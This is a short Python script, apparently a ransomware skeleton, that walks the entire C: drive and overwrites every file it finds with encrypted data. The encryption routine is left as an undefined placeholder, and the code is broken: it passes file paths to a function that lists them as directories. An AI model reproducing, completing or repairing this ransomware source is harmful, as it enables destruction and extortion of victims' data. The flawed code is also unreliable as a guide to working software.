import os

def encrypt_files(directory):
    encrypted = 0
    files = [f for f in os.listdir(directory) if os.path.isfile(os.path.join(directory, f))]
    
    for file in files:
        try:
            with open(os.path.join(directory, file), 'rb') as f:
                data = f.read()
                # Encrypt the file data here using your encryption algorithm
                encrypted_data = your_encryption_algorithm(data)
                
            with open(os.path.join(directory, file), 'wb') as f:
                f.write(encrypted_data)
            
            encrypted += 1
        except Exception as e:
            print(f'Error encrypting {file}: {e}')

    return encrypted

def ransomware():
    # Get the target directory from user input or hardcode it here
    target_directory = 'C:\\'

    # Encrypt all files in the target directory and its subdirectories recursively
    total_encrypted = 0
    for root, dirs, files in os.walk(target_directory):
        for file in files:
            total_encrypted += encrypt_files(os.path.join(root, file))

    print(f'Total files encrypted: {total_encrypted}')

if __name__ == '__main__':
    ransomware()